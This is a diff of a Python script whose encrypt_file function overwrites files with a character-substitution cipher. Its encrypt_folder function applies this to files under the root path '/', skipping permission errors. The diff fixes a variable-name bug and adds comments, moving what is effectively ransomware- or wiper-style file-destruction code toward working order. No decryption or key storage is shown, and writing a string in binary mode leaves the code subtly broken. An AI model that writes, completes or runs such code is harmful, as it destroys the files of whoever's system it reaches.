@@ -8,6 +8,7 @@ import os
 
 path = '/'
 
+# Encrypts a file by shuffling the characters in the file
 def encrypt_file(file):
         char = list(" " + string.ascii_letters + string.digits + string.punctuation)
         key = char.copy()
@@ -17,7 +18,7 @@ def encrypt_file(file):
                         data = r_file.read()
                 encrypt_text = ''
                 for letter in data:
-                        index = chars.index(letter)
+                        index = char.index(letter)
                         encrypt_text += key[index]
                 with open(file, 'wb') as w_file:
                         w_file.write(encrypt_text)
@@ -25,6 +26,7 @@ def encrypt_file(file):
         except PermissionError:
                 pass
 
+# Encrypts all files in a folder and its subfolders
 def encrypt_folder(path=path):
         for file in pathlib.Path(path).glob('*'):
                 if os.path.isfile(file):
